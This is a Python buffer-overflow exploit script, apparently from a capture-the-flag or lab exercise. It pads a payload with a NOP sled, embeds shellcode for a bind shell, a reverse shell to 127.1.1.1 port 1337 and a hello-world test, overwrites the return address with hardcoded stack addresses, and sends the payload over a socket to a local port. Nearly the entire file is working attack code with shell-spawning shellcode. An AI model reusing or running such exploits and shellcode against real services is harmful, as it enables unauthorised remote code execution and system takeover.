#! /usr/bin/env python
import socket
import struct
import sys
from pwn import p64 , p32
port=7777	
offset=1036
offset_pwnat=524
payload="\x90"*offset+"BBBB"
shellcode=b""
shellcode+=b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
shellcode+=b"\x5e\x48\x31\xd2\x0f\x05\x48\x97"
shellcode+=b"\x6a\x02\x66\xc7\x44\x24\x02\x11"
shellcode+=b"\x5c\x54\x6a\x2a\x58\x5e\x6a\x10"
shellcode+=b"\x5a\x0f\x05\x6a\x03\x5e\x6a\x21"
shellcode+=b"\x58\x48\xff\xce\x0f\x05\xe0\xf6"
shellcode+=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62"
shellcode+=b"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
shellcode+=b"\x5f\xb0\x3b\x99\x0f\x05"



# revshell with auth 
buf="\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# nc -lvp 1337
shellcode="\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
port=int(sys.argv[1])
hello_world_shellcode="\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x52\x6a\x0a\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
print(p32(0xffffc790))
eip_addr="\xa0\xd6\xff\xff"  #0xffffc77c 0xffffc730 0xffffc730
# 0xffffd5f0, 0xffffd6a0, 0xffffd730
# 0xffffd680,
eip_addr_pwnat="\xf0\xd5\xff\xff" #0xffffd5f0
#eip_addr=p64(0x7fffffffd5a0) #0x7fffffffd5a0
payload="\x90"*(offset_pwnat-len(buf))+buf+eip_addr

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', port))
s.send(payload)
#print s.recv(1024)

s.close()